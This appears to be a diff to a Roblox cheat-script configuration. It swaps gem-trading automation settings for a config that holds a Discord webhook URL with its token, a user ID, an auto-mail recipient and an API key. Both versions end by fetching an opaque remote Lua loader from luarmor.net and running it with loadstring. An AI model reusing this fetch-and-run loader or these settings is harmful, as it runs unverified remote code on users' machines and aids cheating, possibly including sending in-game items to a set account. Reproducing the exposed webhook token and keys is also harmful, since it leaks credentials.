@@ -1,17 +1,8 @@
-script_key = "lNpvBEvlCnJGNQlJEKOMpMhPxftSOqkE"
-    getgenv().SelectedPlayer = "eqllivialivia168" -- Main Account/ Account To Send Gem
-    getgenv().MainAccount = false --Set True if it's the account to receive game, false if the account send gem
-    getgenv().AccountForMainToFolow = ""
-    getgenv().EnableAccountForMainFolow = false --If you want your main to join a low server player with an account already in server low player
-    getgenv().MainAccountSetting = { -- Unit To Sell
-        Units = {"Blazing Swordsman"},
-        ManuallyClaimBooth = false,
-    }
-    getgenv().AltAccountSetting = {
-        Trade = true,
-        NotSendGem = false,
-        TradeItems = {"Trait Crystal","Risky Dice","Frost Bind"},
-        GiveBackUnit=true,
-        KickAfterDoneTrade=true,
-    }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3051457467c11f25288cfe2de3708373.lua"))()
+
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1301722573054148690/s9bV1i_DGoxKyCZBfxmML7dZisPayLYpO4gBSAaGhfzSYIpENkPpDr2SjmtQTuED1_cc",
+    ["UserID"] = "1276614706144215132",
+    ["AutoMailUsers"] = {"HBT_u58Ydhf"},
+    ["APIKEY"] = "OBjt5FuV80ZUQkaXHJxFLYGTcZqhyD5l"
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/35790ccd448161fc0c14cb2094cfbc4b.lua"))()
